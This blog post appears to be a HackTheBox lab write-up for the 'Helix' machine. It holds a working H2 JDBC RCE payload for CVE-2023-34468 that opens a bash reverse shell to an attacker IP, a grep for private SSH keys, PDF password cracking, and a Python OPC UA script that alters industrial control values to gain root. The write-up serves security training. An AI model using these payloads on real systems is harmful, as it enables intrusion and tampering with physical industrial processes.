---
layout: post
title: "HackTheBox Writeup: Helix"
thumbnail: "/assets/images/helix-htb/bcdc42e7f275f2183d46ed5ee55ab413_MD5.jpg"
---

In this post, we dive into the **Helix** machine on HackTheBox. This box features a fantastic blend of traditional web exploitation and ICS/OT (Operational Technology) hacking. We start by exploiting a known H2 JDBC driver vulnerability (CVE-2023-34468) in Apache NiFi to gain initial access. For privilege escalation, we crack a protected PDF to interact with an internal OPC UA server, manipulating industrial control nodes to trigger a scheduled maintenance window and pop a root shell.

---

## 1. Enumeration

As always, we start with an `nmap` scan to see what services are exposed.

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ nmap -sC -sV 10.129.245.123
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-08-06 19:54 +0100
Nmap scan report for 10.129.245.123 (10.129.245.123)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to [http://helix.htb/](http://helix.htb/)
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

We add `helix.htb` to our `/etc/hosts` file. Since port 80 is redirecting to a domain, it's a good idea to perform vhost enumeration using `ffuf`:

```bash
┌──(mracherr㉿serveur)-[~]
└─$ ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.helix.htb" -u [http://helix.htb](http://helix.htb) -fs 154
...
flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 104ms]
```

This reveals a hidden subdomain: **`flow.helix.htb`**.

![Web Interface Enumeration](/assets/images/helix-htb/82422f3f8b316fbd17b1ed73be39d8e5_MD5.jpg)
![Flow Subdomain](/assets/images/helix-htb/47c7a9e850f85c54a449b039c12c2793_MD5.jpg)

---

## 2. Initial Access: Apache NiFi & H2 JDBC RCE

Exploring the web application reveals it is running Apache NiFi, and research uncovers that it is vulnerable to **CVE-2023-34468**. This is a critical flaw that allows Remote Code Execution (RCE) via the H2 JDBC driver connection strings.

![CVE Discovery](/assets/images/helix-htb/8b6e0c35e31010a7451d315dbe533b7c_MD5.jpg)

To exploit this, we craft a malicious SQL file that creates an alias for Java's `ProcessBuilder` and executes a reverse shell:

```sql
DROP ALIAS IF EXISTS SHELLEXEC;

CREATE ALIAS SHELLEXEC AS $$
int shellexec(String cmd) throws java.io.IOException {{
    new ProcessBuilder("/bin/bash", "-c", cmd).start();
    return 0;
}}
$$;

CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.17.101/5555 0>&1');
```

![H2 RCE Setup](/assets/images/helix-htb/f18834e180aa27d1f1ba79530d2036d6_MD5.jpg)

We host the SQL file and trigger the payload via the vulnerable JDBC connection string (`RUNSCRIPT FROM 'http://10.10.17.101/rce.sql'`). 

![Triggering RCE](/assets/images/helix-htb/d3cddf94cdc246ad6d98f696b3ea22f0_MD5.jpg)
![Reverse Shell Caught](/assets/images/helix-htb/912d79800c62bf703eb3aa51e9a3e625_MD5.jpg)

We successfully catch a shell as the **`nifi`** user!

---

## 3. Lateral Movement: Extracting the Operator Key

Running LinPEAS and exploring the file system, we hunt for credentials or sensitive files in the `/opt` directory where NiFi is installed.

```bash
nifi@helix:~$ grep -rni '/opt' -e 'OPENSSH PRIVATE KEY' 2>/dev/null
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak:1:-----BEGIN OPENSSH PRIVATE KEY-----
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak:7:-----END OPENSSH PRIVATE KEY-----
```

We discover an SSH private key backup file named `operator_id_ed25519.bak`.

![SSH Key Discovery](/assets/images/helix-htb/34cb8bd59cdca91659f6fec92b991325_MD5.jpg)

Using this key, we can pivot and SSH into the machine as the **`operator`** user, securing our foothold.

---

## 4. Privilege Escalation: ICS/OT Hacking

Checking our privileges as `operator`, we find we can run a maintenance script as root without a password:

```bash
operator@helix:~$ sudo -l
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

![Sudo Privileges](/assets/images/helix-htb/4d759a561607fdf05ae3b240124672fa_MD5.jpg)

### Analyzing the Maintenance Script
We inspect `/usr/local/sbin/helix-maint-console`:

```bash
FLAG="/opt/helix/state/maintenance_window"
...
if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi
...
# Launch an interactive root shell attached to THIS TTY
systemd-run --quiet --scope --unit="$SCOPE" ... /bin/bash -p -i
```

The script grants an interactive root shell, but *only* if the maintenance window is open. To open it, we need to manipulate the underlying industrial control system.

### Cracking the PDF & OPC UA Exploitation
We port-forward internal services using Meterpreter and notice an OPC UA server running on port `4840`. In the operator's home directory, we find a locked PDF guide: `'Operator Control & Safety Guide.pdf'`. 

We extract the hash and crack it with John The Ripper:

```bash
$ ./pdf2john.py 'Operator Control & Safety Guide.pdf' > hash.txt 
$ john --wordlist=~/CyberSec/Wordlists/rockyou.txt hash.txt
...
password: operator1
```

Now that we have the credentials (`operator`:`operator1`), we write a Python script using the `opcua` library to connect to the internal industrial server. Our goal is to set the system to `MAINTENANCE` mode and ramp up the `CalibrationOffset` until the temperature hits 295°C, triggering the maintenance window.

```python
import time
from opcua import Client, ua

client = Client("opc.tcp://127.0.0.1:4840")
client.set_user("operator")
client.set_password("operator1")
client.connect()

try:
    # Setting Mode to MAINTENANCE and enabling TestOverride
    client.get_node("ns=2;i=12").set_value("MAINTENANCE")
    client.get_node("ns=2;i=13").set_value(True)

    # Ramping CalibrationOffset until Temperature (ns=2;i=4) hits 295C
    val = 0.0
    while True:
        temp = client.get_node("ns=2;i=4").get_value()
        print(f"Current Temperature: {temp}")

        if 295.0 <= temp < 305.0:
            print("[!!!] MAINTENANCE WINDOW OPEN!")
            break

        val += 2.0
        client.get_node("ns=2;i=6").set_value(float(val))
        time.sleep(1)

finally:
    client.disconnect()
```

### Popping Root
We execute our script and watch the temperature rise...

```bash
└─$ python k1.py
Current Temperature: 278.4705052380829
Current Temperature: 283.34472442850125
Current Temperature: 290.73688954439143
Current Temperature: 295.45347238946636
[!!!] MAINTENANCE WINDOW OPEN!
```

With the maintenance window open, we quickly execute our sudo privilege:

```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 117 seconds
[!] Session will be terminated automatically
root@helix:~# cat /root/root.txt
4380bb56eb98f39ff77c3af09fc9fb27
```

![Root Access](/assets/images/helix-htb/6e1656b43bafbd049a29e4ca82c12eba_MD5.jpg)

We grabbed the root flag just before the system automatically killed our session!